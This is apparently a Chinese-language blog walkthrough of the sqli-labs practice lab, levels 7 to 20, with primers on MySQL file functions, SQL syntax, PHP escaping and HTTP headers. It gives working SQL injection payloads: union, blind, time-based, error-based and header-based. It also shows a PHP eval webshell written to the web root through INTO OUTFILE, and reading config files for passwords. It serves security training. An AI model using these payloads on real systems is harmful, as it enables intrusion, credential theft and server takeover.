语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。 在注入的过程中，我们往往需要一些特殊的文件，比如说配置文件，密码文件等。当拥有数据库的权限时，可以将系统文件利用load data infile导入到数据库中。 例如： 1load data infile '/tmp/to.txt' ignore into table to character set gbk fields terminated by '\\t' lines terminated by '\\n' 将/tmp/to.txt导入到t0表中，character set gbk是字符集设置为gbk，fileds terminated by 是每一项数据之间的分隔符，lines terminated by 是行的结尾符 当错误代码为2时，文件不存在，错误代码为13时没有权限，可以考虑/tmp文件 导入到文件1select ......into outfile 'file_name' 可将被选择的某一行写入到一个文件中，该文件被创建到服务器主机上，前提是拥有file权限，才能使用该语法，file_name不能是一个已经存在的文件。 一般有两种利用形式： 直接将select内容导入到文件中： 1select version() into outfile \"c:\\\\phpnow\\\\htdocs\\\\test.php\" 此处将version()替换成y一句话，也可以使用即： 1select &lt;?php @eval($_post[\"mima\"]) ?php&gt; into outfile \"c:\\\\phpnow\\\\htdocs\\\\test.php\" 然后直接连接一句话即可，其实在select内容还可以上传很多的内容。 修改文件结尾 1select version() into outfile &quot;c:\\\\phpnow\\\\htdocs\\\\test.php&quot; lines terminated by 0x16 进制文件 通常情况下，用‘\\r\\n’结尾，此处修改为自己想要的任何文件，同事可以用FIELDS TERMINATED BY。16进制可以为一句话或者其他任何的代码 TIPS: (1)可能在文件路径当中要注意转义，具体看环境 (2)load_file()当前台无法导出数据的时候，可以使用： 1select load_file('c:\\\\wamp\\\\bin\\\\mysql\\\\mysql5.6.17\\\\my.ini') into outfile 'c:\\\\wamp\\\\www\\\\test.php' 可利用该语句将服务器当中的内容导入到web服务器的目录中，这样就可以找到数据。在my.ini当中存在password项（默认被注释），会有很多可以被导出来。 less7连接标题是dump into outfile 意思就是利用文件导入的方式进行注入。 首先还是回归源码中： 1$sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\"; 在源码中对id参数进行 &#39;))处理，可以尝试 &#39;)) or 1=1 -- +进行注入 1http://localhost/sqli-labs-master/Less-7/?id=1')) or 1=1 -- + 以下为使用文件导入的方式进行注入： 1http://localhost/sqli-labs-master/Less-7/?id=1')) union select 1,2,3 into outfile \"D:\\\\phpStudy\\\\WWW\\\\sqli-labs-master\\\\Less-7\\\\uuu.txt\" -- + 图中显示sql出错但是在文件中还是创建了uuu.txt文件。 ps:若无法生成文件，需要将my.ini配置文件中的secure_file_priv选项设置为空，若无该选项则添加设置secure_file_priv=’’ 测试完成则将一句话木马放进去 1http://localhost/sqli-labs-master/Less-7/?id=1')) union select 1,2,'&lt;?php @eval($_post[\"mima\"]) ?&gt;' into outfile \"D:\\\\phpStudy\\\\WWW\\\\sqli-labs-master\\\\Less-7\\\\yijuhua.php\" -- + 当访问页面时，一句话没有显示 然后使用菜刀进行连接。 less8通过测试发现or 1=1 -- +返回正常，参考less5的playload进行注入 12http://localhost/sqli-labs-master/Less-8/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5)) -- + //数据库名第一位为shttp://localhost/sqli-labs-master/Less-8/?id=1' and if(ascii(substr(database(),2,1))=101，1，sleep(5)) -- + //数据库名第二位为e 测试发现可以使用延时注入，并查看less8的源码得到： 123456789101112131415161718192021222324$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; //echo 'You are in...........'; //print_r(mysql_error()); //echo \"You have an error in your SQL syntax\"; echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125; 在源码中发现当数据库查询发生错误时，没有输出任何的报错信息，也就是与less5相比，我们无法使用报错注入的方式。其余playload与less5一致。 123456789http://localhost/sqli-labs-master/Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80 -- + //返回是正确的，测试至101开始报错，说明security库下第一个表的第一个字符为ehttp://localhost/sqli-labs-master/Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;80 -- + //返回正确，测试至109报错，得到第二个字符为mhttp://localhost/sqli-labs-master/Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;80 -- + //返回正确，测试至114开始报错，说明security下第二个表的第一个字符为rhttp://localhost/sqli-labs-master/Less-8/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1) -- + //查询user表中的列名是否有us**的列http://localhost/sqli-labs-master/Less-8/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)-- + http://localhost/sqli-labs-master/Less-8/?id=1' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))=68 -- + //获取表中的内容，获取username中第一行的第一个字符的ascii，与68进行比较即为D，然后差不多都是直接重复上面换字符位置的查询操作 less9在连接的标题看到该关卡是关于基于时间-单引号的注入方式，明显是需要通过延迟注入，同时将对参数id进行&#39;进行处理。既然前面已经有延时注入的方式，所以这边直接贴playload 123456789101112131415猜测数据库名http://localhost/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5)) -- + //说明第一位是s (ascii为115)http://localhost/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),2,1))=101,1,sleep(5)) -- + //说明第二位是e......以此类推，得到数据库名为security猜测security的数据表http://localhost/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5)) -- + //猜测第一个数据表的第一位为e，以此类推得到emailshttp://localhost/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))=114,1,sleep(5))-- + //猜测第二个数据表emails,referers, uagents,users猜测users表的列http://localhost/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5)) -- + //猜测users表的第一列的第一个字符是i，然后以此类推得到列名为 id，username，password猜测username的值http://localhost/sqli-labs-master/Less-9/?id=1’ and if(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5)) -- + //猜测username的第一行的第一位 以此类推得到数据库username，password的所有内容 上述过程就是通过延时注入的全部过程，当然也可以使用benchmark（）函数进行注入。 less10标题提示基于时间-双引号，与less9一样，该关卡使用的是延时注入的方式，区别在于less9对id进行的是单引号处理，而这边是使用双引号处理。 12猜测数据库名http://localhost/sqli-labs-master/Less-10/?id=1\" and if(ascii(substr(database(),1,1))=115,1,sleep(5)) -- + 其余的playload参考less9的内容一样 less11这边开始要通过post提交数据，post就是将数据从客户端提交到服务器端。例如下面这个界面，通过界面输入用户名和密码，用户名和表单以表单的形式提交，提交到服务器后服务器再进行验证。这就是一个post的过程。 进行post注入有两种方式进行，一种是直接在页面进行传输数据，但是这样比较不直观，另一种是使用burpsuite进行报文拦截然后进行修改发送，比较直观。使用burpsuite拦截本地主机报文需要进行设置。(以Google chrome为例) 在代理插件处将不拦截报文的地址将内容删除 将Internet选项中的连接-》局域网设置中的代理服务器进行设置，如下 查看本地ip地址，将浏览器中的localhost该ip地址 就可以使用burpsuite的报文 由上面这张图可以看到通过post传输的参数共有三个 1uname=1&amp;passwd=1&amp;submit=Submit 其中键入的数据的变量为uname和passwd，通过像get参数传输的注入方式进行post注入，例如： uname:admin&apos; passwd: 111(随便输入)数据库进行了报错回显，通过报错信息我们发现sql查询语句进行了单引号处理 传入参数：uname:admin’# 密码随意 发现直接将用户名密码查询出来了，username：admin password：admin。当提交username和password后，后台形成的sql语句为 1SELECT username, password FROM users WHERE username='admin'#' and password='$passwd' LIMIT 0,1 #将admin后面的内容注释掉，而在数据库中包含admin用户名所以语句成立，此时就使用admin进行了登录，然后尝试使用get注入中用到的其他语句进行代替or 1=1进行注入。 123456789101112131415username: 1admin'union select 1,database()#passwd: 任意密码//得到数据库名称为securityusername: 1admin' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'#passwd:任意密码//得到数据库内的所有表名emails,referers,uagents,userusername:1admin' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#passwd：任意//得到users表中的列名：id,username,passwordusername:1admin' union select username,password from users where id=3#passwd:任意密码//得到任意用户的用户名和密码 less12当键入username:admin’ passwd:1 没有任何的报错回显， 尝试双引号，即username：admin” passwd:1 错误回显发现1”) LIMIT 0,1，发现在参数进行了处理将username进行了处理，需要增加）。 所以参照less11构造相关的查询语句变量 123456789101112131415username:1admin\") union select 1,database()#passwd:任意//获得数据库名securityusername:1admin\") union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'#passwd: 任意//获得表名emails,referers,uagents,usersusername:1admin\") union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#passwd:任意//获得列名id,username,passwordusername:1admin\") union select username,password from users where id=3#passwd:任意//可查询所有用户信息 less13键入变量值：username: admin’ password: 1(任意) 获得报错信息1’) LIMIT 0,1可知是username进行了‘）处理，将参数增加）进行注入尝试，username: admin’) # password: 1 发现回显的只有成功登录的信息，没有返回的用户信息，这样就只能使用布尔盲注进行。 1234567891011121314151617181920212223242526272829303132333435uname:admin') and length(database())=8#passwd:1//猜测数据库名长度为8uname:admin') and left(database,1)&gt;'a'#passwd:1//猜测数据库名的第一位为suname:admin') and left(database(),2)&gt;'sa'#passwd:1//猜测数据库的第二位为se......逐步猜测数据库名为securityuname:admin') and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;80#passwd:1//猜测数据库security下第一个表名的第一个字符 第一个应为101-》euname:admin') and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),2,1))&gt;108#passwd:1//猜测数据库security下第一个表名的第二个字符 第二个为108-》m......得到数据库security下第一个表名的全程为emailuname:admin') and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))&gt;113#passwd:1//得到数据库security下第二个表名的第一个字符 113—》runame=admin') and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)#passwd:1//regexp获取users表中的列名，是否有us**列......查询出users表中的列名uname:admin') and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))=68#//利用ord()和mid()函数获取users表中的内容，获取username中的第一行的第一个字符的ascii，与68进行比较即为D，而第一行的数据是Dumb。 less14使用uname:admin’ passwd:1尝试发现不行，然后使用uname:admin” passwd:1发现有了报错回显，根据错误显示，对username进行了”处理。 uname:admin”# passwd:1 成功登陆后发现与less13一样，没有用户信息返回，使用盲注的方式就行注入。 123uname:admin\" and length(database())=8#passwd:1//测试数据库名长度为8 其余参考less13，只需将‘)改为“就行了 也可使用报错注入的方式。 123uname:admin\" and extractvalue(1,concat(0x7e,(select @@version),0x7e))#passwd:1//获取数据库版本号 12345678910111213141516171819202122232425uname:admin\" and extractvalue(1,concat(0x7e,(select database()),0x7e))#passwd:1//获取数据库名securityuname:admin\" and rxtractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='users' limit 0,1),0x7e))#passwd:1//获取数据库security下的第一个表名为email//本想回去获取所有表名的，使用admin“ and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='users'),0x7e))#//发现返回的错误是Subquery returns more than 1 row并没有获取到相应的信息uname:admin\" and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='users' limit 1,1),0x7e))#passwd:1//获取数据库security下第二个表名为referers......重复构造相应的轮子至使所有的表格注入出来uname:admin\" and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e))#passwd:1//获取users表中第一列的列名id以此类推，将所有列名注入出来uname:admin\" and extractvalue(1,concat(0x7e,(select username from users where id=3),0x7e))#passwd:1//注出id=3的用户名uname:admin\" and extractvalue(1,concat(0x7e,(select password from users where id=3),0x7e))#//注出id=3的密码 less15本关卡通过admin&#39;和admin&quot;进行都没有任何的错误返回，查看源码得到sql查询语句 1@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\"; 获知对uname进行单引号处理，同时无法使用报错注入的方式，可以使用延时注入。 12345uname:admin' and if(ascii(substr(database(),1,1))=115,1,sleep(5))#passwd:1uname；admin' and if(ascii(substr(database(),2,1))=101,1,sleep(5))#passwd:1//逐步猜测出数据库名为security 当正确时可以直接登录，不正确则会延迟5秒 1234567891011121314151617181920212223242526uname:admin' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))#passwd:1//security下第一个表名的第一个字符 101-》euname:admin' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),2,1))=108,1,sleep(5))#passwd:1//security下第一个表名的第二个字符 108-》m....逐步猜测表名为emailsuname:admin' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))=114,1,sleep(5))#passwd:1//security下第二个表名的第一个字符 114-》r......逐步猜测所有表名uname:admin' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))#passwd:1//猜测表中第一个列名的第一个字符 105-》i.....逐步猜测出所有列名uname:admin' and if(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))#passwd:1//猜测username的第一行中的第一位 69-》D .....逐步猜测出所有的用户名和密码 less16通过使用 admin和 admin&quot;进行尝试，发现没有任何的反应，猜测要使用延时注入的方式进行，查看源码发现sql查询语句： 123$uname='\"'.$uname.'\"';$passwd='\"'.$passwd.'\"'; @$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\"; 查询语句中将uname和passwd进行了双引号和括号处理，所以将less15中的playload进行单引号变双引号加上括号即可。 12345678uname:admin\") and if(ascii(substr(database(),1,1))=115,1,sleep(5))#passwd:1//查询数据库名的第一个字符是否为 s 115-》suname:admin\") and if(ascii(substr(database(),2,1))=101,1,sleep(5))#passwd:1//查询数据库名第二个字符为e 101-》e......逐步查询出数据库名为security 当语句正确时可以直接登录，不正确时延时5秒 。其余playload与less15一样 1234567891011121314151617181920212223242526uname:admin\") and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5)#passwd:1//查询security下第一个表的第一个字符是否为e 101-》euname:admin\") and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),2,1))=108,1,sleep(5))#//查询security下第一个表的第二个字符是否为m 108-》m......逐步查询出第一个名emailsuname:admin\") and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))=114,1,sleep(5))#passwd：1//查询security第二个表的第一个字符是否为r 114-》runame:admin\") and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),2,1))=101,1,sleep(5))#passwd:1//查询security第二个表的第二个字符是否为e 101-》e......逐步查询出第二个表名为referersuname:admin\") and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))#passwd:1//查询users表中的列名uname:admin\") and if(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))#passwd:1//猜测username的第一行中的第一位 69-》D .....逐步猜测出所有的用户名和密码 Background-4 数据库增删改查数据库最常用的四个功能，增删改查 增加一行数据insert,语法： 123456789101112//插入单行insert [into] &lt;表名&gt; (列名) values (列值);例：insert into students (姓名，性别，出生日期) values('一一一','男','1980/6/6');//将现有表数据添加到一个已有表insert into &lt;已有的新表&gt; &lt;列名&gt; select &lt;原表列名&gt; from &lt;原表名&gt;;例：insert into students ('姓名','性别','出生日期') select 姓名,性别,出生日期 from studentmessages;//用现有数据表创建一个新表并填充select &lt;新建表列名&gt; into &lt;新建表名&gt; from &lt;源表名&gt;;例：select name,address,email into students from studentmessages;//使用union关键字合并数据进行插入多行insert &lt;表名&gt; &lt;列名&gt; select &lt;列值&gt; union select &lt;列值&gt;;例：insert students (姓名,性别,出生日期) select '一一一','男','1980/6/6' union select '二二二','男','1980/7/7'; 删除一行数据 delete 123456789//删除&lt;满足条件的&gt;行delete from &lt;表名&gt; [where &lt;删除条件&gt;];例：delete from a where name='一一一';//删除整个表drop table &lt;表名&gt;例：drop table students;//删除数据库drop database 数据库名删除表中的列：alter table 表名 drop column 列名; 更改数据 update 12update &lt;表名&gt; set &lt;列名=更新值&gt; [where &lt;更新条件&gt;]例：update students set 年龄=18 where 姓名='三三三'; 查询数据 select 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//精准（条件）查询select &lt;列名&gt; from &lt;表名&gt; [where &lt;查询条件表达试&gt;] [order by &lt;排序的列名&gt;[asc或desc]]1.查询所有行与列select * from a;2.查询部分的行列--条件查询select i,j,k from a where f=5;3.在查询中使用as更改列名select name as 姓名 from a where xingbie='男';//查询a表中性别为男的所有行，显示name列，并将name列名为（姓名）显示4.查询空行select name from a where email is null;//查询表a中email为空的所有行，并显示name列5.在查询中使用常量select name, '唐山' as 地址 from student;//查询表a,显示name列，并添加地址列,其列值都为'唐山'6.查询返回限制行数select top 6 name from a;//查询表a,显示列name前6行，top为关键字select TOP 60 percent name from a;//查询表a,显示列name的60%，percent为关键字7.查询排序（关键字：order by, asc, desc）select name from a where chengji&gt;=60 order by desc;//查询a表中的chengji大于等于60的所有行，并按降序显示name列，默认是asc升序//模糊查询1.使用like进行模糊查询（like运算符只用于字符串，仅与char和varchar数据类型联合使用）select * from a where name like '赵%';//查询显示表a中，name字段第一个字为赵的记录2.使用between在某个范围内进行查询select * from a where nianling between 18 and 20;//查询表a中nianling在18到20之间的记录3.使用in在列举值内进行查询select name from a where address in ('北京','上海','唐山');//查询表a中address值为北京或者上海或者唐山的记录，显示name字段//分组查询1.使用group by 进行分组查询select studentID as 学员编号，AVG(score) as 平均成绩 from score group by StudentID//第一个score是列名，第二个score是表名//在表score中查询，按照studentID字段进行分组，显示studentID字段和score字段的平均值select语句中只允许被分组的列和为每个分组返回的一个值的表达式，例如用一个列名作为参数的聚合函数2.使用having子句进行分组筛选select studentID as 学员编号,AVG(score) as 平均成绩 from score group by studentID having count(score)&gt;1;//第一个score是列名，第二个score是表名//显示分组后count(score)&gt;1的行，由于where只能在没有分组时使用，分组后只能使用having来限制条件//多表连接查询1.内联接(1)在where子句中指定联接条件select a.name,b.chengji from a,b where a.name=b.name//查询表a和表b中name字段相等的记录，并显示表a中的name字段和表b中的chengji字段(2)在from子句中使用join...onselect a.name,b.chengji from a inner join b on (a.name=b.name);2.外连接(1)左外联接查询select s.name,c.courseID,c.score from students as s left outer join score as c on s.scode=c.studentID;//在students表和score表中查询满足on条件的行，条件为score表的studentID与students表中的sconde相同(2)右外联接查询select s.name,c.courseID,c.score from students as s right outer join score as c on s.scode=c.studentID//在students表和score表中查询满足on条件的行，条件为students表中的sconde与score表的stuentID相同 less17由页面标题得知，这是一个密码重置的过程，主要会利用到update语句。 尝试使用报错注入 12uname:adminpasswd:1' 错误回显： 1near 'admin'' at line 1 说明在重置密码的时候使用单引号进行处理。使用报错盲注 123uname:adminpasswd=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))#//获取数据库版本 将@@version换成需要查询的子句即可 1234567891011121314151617uname:admin passwd:1' and extractvalue(1,concat(0x7e,(select database()),0x7e))#//获取数据库名uname:adminpasswd:1' and extractvalue(1,concat(0x7e,(select table_name from infromation_schema.tables where table_schema='security' limit 0,1),0x7e))#//查询第一个表名.....逐步查询所有表名uname:adminpasswd:1' and extractvalue(1,concat(0x7e,(select columns_name from information_schema.columns where table_name='users' limit 0,1),0x7e))#//查询users表中的列名uname:adminpasswd:1' and extractvalue(1,concat(0x7e,(select username from users where id=3),0x7e))#//查询用户名和密码 这边使用passwd作为注入点而不是像之前的使用uname，是因为在后台对uname进行了处理。 1234567891011121314151617181920212223242526272829$uname=check_input($_POST['uname']); $passwd=$_POST['passwd'];//check_input函数如下function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = \"'\" . mysql_real_escape_string($value) . \"'\"; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; 后台对uname参数进行check_input()函数进行检查。 此处需要了解的一些函数： addslashes() addslashes()函数返回在预定义字符之前添加反斜杠的字符串 预定义字符： 单引号 &#39; 双引号 &quot; 反斜杠 \\ NULL tips：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。 默认情况下，php对所有的GET、POST和COOKIE数据自动运行addslashes(),所以不应对已转义过的字符串使用addslashes()，否则将导致双层转义，遇到这种情况时可使用get_magic_quotes_gpc()进行检测。 语法：addslashes(string) 参数stringi 是必需字段，规定要转义的字符 返回值为已转义的字符串 要求在PHP 4+版本 stripslashes() 函数删除由addslashes()函数添加的反斜杠 mysql_real_escape_string() 函数转义SQL语句中使用的字符串中的特殊字符。 主要是以下字符受影响： \\x00 \\n \\r \\ ‘ “ \\x1a 如果成功，则该函数返回被转义的字符串。如果失败，则返回false 语法：mysql_real_escape_string(string,connection) 参数 描述 string 必需，规定要转义的字符串 connection 可选，规定Mysql连接，如果未规定，则使用上一个连接 本函数string中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用mysql_query()。 所以在本关卡check_input()中，对username进行各种转义的处理，所以此处不能使用uname进行注入。 Background-5 HTTP头部介绍Http头部详解 1.Accept：告知web服务器自己接受什么介质类型，*/*表示任何类型， type/*表示该类型下的所有子类型，type/sub-type 2.Accept-Charset:浏览器申明自己接收的字符串 Accept-Encoding:浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate) Accept_Language:浏览器申明自己接收的语言 语言与字符串的区别：中文是语言，中文有很多字符集，比如big5，gb2312，gbk等 3.Accept_Ranges:web服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受 4.Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间。 5.Authorization:当客户端接收来自WEB服务器的WWW-Authenticate响应时，用该头部来回应自己的身份验证信息给WEB服务器 6.Cache-Control： 请求： no-cache（不要缓存的实体，要求现在从web服务器获取） max-age:(只接受Age值小于max-age值，并没有过期的对象) max-stale:(可以接受过期的对象，但是过期时间必须小于max-stale值) min-fresh:（接受其新鲜生命期大于其当前Age跟min-fresh值之和的缓存对象） 响应： public（可以使用Cached内容回应任何用户） private(只能用缓存内容回应先前请求该内容的那个用户) no-cache(可以缓存，但是只有跟web服务器验证其有效后，才能返回给客户端) max-age： （本响应包含的对象的过期时间） ALL：no-store（不允许缓存）7.Connection: 请求： close（告诉web服务器或者代理服务器，在完成本次请求的响应后断开连接，不要等待本次连接的后续请求） keeplive（告诉web服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求） 响应： close（连接已经关闭） keepalive(连接保持着，在等待本次连接的后续请求) Keep-Alive：如果浏览器请求保持连接，则该头部表明希望WEB服务器保持连接多长时间（s），例如：Keep-Alive：3008.Content-Encoding:web服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding:gzip 9.Content-Language:WEB服务器告知浏览器自己响应的对象的语言 10.Content-Length：web服务器告知浏览器自己响应的对象的长度。例如：Content-Length：26012 11.Content-Range: web服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range:bytes 21010-47021/47022 12.Content-Type:WEB服务器告知浏览器自己响应的对象的类型。例如:Content-Type:application/xml 13.Etag:就是一个对象（例如URL）的标志值，就对一个对象而言，比如一个html文件，如果被修改了，其ETag也会别修改，所以ETag的作用跟Last-Modified的作用差不多，主要供web服务器判断一个对象是否改变了。比如前一次请求某个html文件时，获得其ETag,当这次又请求这个文件时，浏览器就会把先前获得的ETag值发送给web服务器，然后web服务器就会把这个ETag跟该文件的当前ETag进行对比，然后就知道这个文件有没有改变。 14.Expired: web服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟web服务器验证了其有效性后，才能用来响应客户请求。是HTTP/1.0的头部。例如：Expires:Sat,23 May 2009 10:02:12 GMT 15:HostL:客户端指定自己想访问的web服务器的域名/IP地址和端口号。例如：Host：rss.sina.com.cn 16:If-Match:如果对象的ETag没有改变，意味着对象没有改变，才执行请求的动作。 17.If-None-Match：如果对象的ETag改变了，意味着对象也改变了，才执行请求的动作 18.If-Modified-Since:如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告知浏览器该对象没有修改。例如：If-Modified-Since:Thu, 10 Apr 2008 09:14:42 GMT 19.If-Unmodified-Since:如果请求的对象在该头部指定的时间之后没有修改过，才执行请求的动作（比如返回对象） 20.If-Range:浏览器告诉WEB服务器，如果浏览器请求的对象没有改变，就把缺少的部分给浏览器，如果对象改变了，就将整个对象给浏览器。浏览器通过发送请求对象的ETag或者自己所知道的最后修改时间给web服务器，让其判断对象是否改变。总跟Range头部一起使用。 21.Last-Modified：WEB服务器认为对象的修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified: Tue,06 May 2008 02:42:43 GMT 22.Location:Web服务器告知浏览器，试图访问的对象已经被转移到别的位置，到该头部指定的位置去取。例如：Location：http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif 23.Pramga:主要使用 Pramga: no-cache,相当于Cache-Control: no-cache。例如：Pragma:no-cache 24.Proxy-Authenticate:代理服务器响应浏览器，要求其提供代理身份证验证信息。 Proxy-Authorization:浏览器响应代理服务器的身份验证请求，提供自己的身份信息。25.Range:浏览器（例如：Flashget 多线程下载时）告知web服务器自己想取对象的哪部分。例如：Range:bytes=1173546- 26.Referer: 浏览器向web服务器自己是从哪个网页/URL获得/点击当前请求中的网址/URL。例如：Referer: http://www.sina.com/ 27.Server:web服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61（Unix） 28：User-Agent：浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent: Mozilla/5.0(Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、 0、 0、 14 29.Transfer-Encoding:web服务器表明自己对本响应消息体作什么编码，比如是否分块(chunked)。例如：Transfer-Encoding:chunked 30.Vary:WEB服务器用该头部的内容告诉Cache服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源web服务器在接到第一个请求消息时，其响应消息的头部为：Content-Encoding:gzip; Vary:Content-Encoding 那么Cache服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache服务器用自己Cache里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary: Accept-Encoding 31.Via:列出从客户端到OCS或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加Via头部，并填上自己的相关信息，当下一代代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求Via头部，并把自己的相关信息加到后面，以此类推，当OCS收到最后一个代理服务器的请求时，检查Via头部，就知道该请求所经过的路由。例如：Via： 1.0 236.D0707195.sina.com.cn:80 (squid/2.6.STABLE13) less18从源码中看到： 12$uname = check_input($_POST['uname']);$passwd = check_input($_POST['passwd']); 再本关卡对uname和passwd进行了check_input()函数处理，所以无法通过uname和passwd进行注入行不通，查看源码，发现sql语句： 1$insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; 将useragent和ip插入到数据库中，那么是否可以尝试用这个进行注入？IP地址我们一般无法更改，但是可以通过抓包软件修改useragent。使用burpsuite进行抓包并修改报文。 从上图可以看到，当提供正确的账号密码之后前台可以显示user-agent并且内容是我们通过报文修改之后的，那么当我们将user-agent内容改为注入语句呢？ 例如： 1user-agent: 'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1 可以看到已经获取到版本号 1234567891011121314user-agent: 'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1//获取数据库名user-agent: 'and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e)) and'1'='1//获取security数据库下第一个表名 emailsuser-agent: 'and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 1,1),0x7e)) and '1'='1//获取security数据库下第二个表名 referers......可获取所有表名user-agent: 'and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e)) and '1'='1//获取users表中的列名......参考之前的playload less19查看本关卡的源码 12345$uagent = $_SERVER['HTTP_REFERER'];$IP = $_SERVER['REMOTE_ADDR'];$insert=\"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')\"; 可以看到，后台从服务器中获取了HTTP_REFERER,那就可以使用与less18一样的方式进行注入，但是需要从referer进行修改。 12345678910Referer: 'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and'1'='1//获取数据库版本Referer: 'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1//获取数据库名称Referer: 'and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e)) and'1'='1//获取数据库表名......参考上面的playload less20查看该关卡源码,发现cookie从username中获取值后，当再次刷新时，会从cookie中读取username，然后进行查询。得知后台流程后，就可以进行注入了。 